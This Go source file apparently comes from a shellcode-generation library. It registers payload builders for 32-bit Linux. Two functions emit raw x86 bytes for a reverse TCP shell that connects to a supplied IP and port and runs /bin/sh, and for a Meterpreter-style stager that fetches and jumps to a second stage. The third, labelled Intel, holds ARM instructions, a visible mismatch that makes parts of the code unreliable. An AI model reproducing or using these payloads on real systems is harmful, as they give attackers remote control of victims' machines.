package modules

import "github.com/awgh/shellcode/api"

func init() {
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits32,
		"reverse_tcp_shell", reverse_tcp_shell_linux_intel_32)
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits32,
		"reverse_tcp_stager", reverse_tcp_stager_linux_intel_32)
	api.RegisterShellCode(api.Linux, api.Intel, api.Bits32,
		"user_shellcode", user_shellcode_linux_intel_32)
}

func reverse_tcp_shell_linux_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.Ip

	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
	//will need to put resume execution shellcode here
	shellcode1 += "\xbd"
	if as, err := api.PackAddr(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" +
		"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68"
		//HOST
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x68\x02\x00"
	//PORT
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1" +
		"\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3" +
		"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

	return []byte(shellcode1), nil
}

func reverse_tcp_stager_linux_intel_32(params api.Parameters) ([]byte, error) {
	port := params.Port
	entry := params.Entry
	ip := params.Ip

	/*
	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
	   Modified metasploit payload/linux/armle/shell/reverse_tcp
	   to correctly fork the shellcode payload and contiue normal execution.
	*/

	shellcode1 := "\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
	//will need to put resume execution shellcode here
	shellcode1 += "\xbd"
	if as, err := api.PackAddr(entry); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xff\xe5"
	shellcode1 += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80" +
		"\x97\x5b\x68"
	//HOST
	shellcode1 += api.PackIP(ip)
	shellcode1 += "\x68\x02\x00"
	//PORT
	if ps, err := api.PackPort(port); err == nil {
		shellcode1 += ps
	} else {
		return nil, err
	}
	shellcode1 += "\x89\xe1\x6a" +
		"\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10" +
		"\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b" +
		"\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1"

	return []byte(shellcode1), nil
}

func user_shellcode_linux_intel_32(params api.Parameters) ([]byte, error) {
	entry := params.Entry
	shellcode_vaddr := uint32(0x0)
	supplied_shellcode := params.ShellCode

	//FORK
	shellcode1 := "\x00\x40\xa0\xe1" // mov r4, r0
	shellcode1 += "\x00\x00\x40\xe0" // sub r0, r0, r0
	shellcode1 += "\x02\x70\xa0\xe3" // mov r7, #2
	shellcode1 += "\x00\x00\x00\xef" // scv 0
	shellcode1 += "\x00\x00\x50\xe3" // cmp r0, #
	shellcode1 += "\x04\x00\xa0\xe1" // mov r0, r4
	shellcode1 += "\x04\x40\x44\xe0" // sub r4, r4, r4
	shellcode1 += "\x00\x70\xa0\xe3" // mov r7, #0
	shellcode1 += "\x00\x00\x00\x0a" // beq to shellcode
	// JMP Address = (entrypoint - currentaddress -8)/4
	jmpAddr := uint32(0xffffff) + (entry - (shellcode_vaddr+uint32(len(shellcode1))-4)/4)
	if as, err := api.PackAddr(jmpAddr); err == nil {
		shellcode1 += as
	} else {
		return nil, err
	}
	shellcode1 += "\xea" //b entrypoint

	//SHELLCODE
	shellcode1 += string(supplied_shellcode)

	return []byte(shellcode1), nil
}
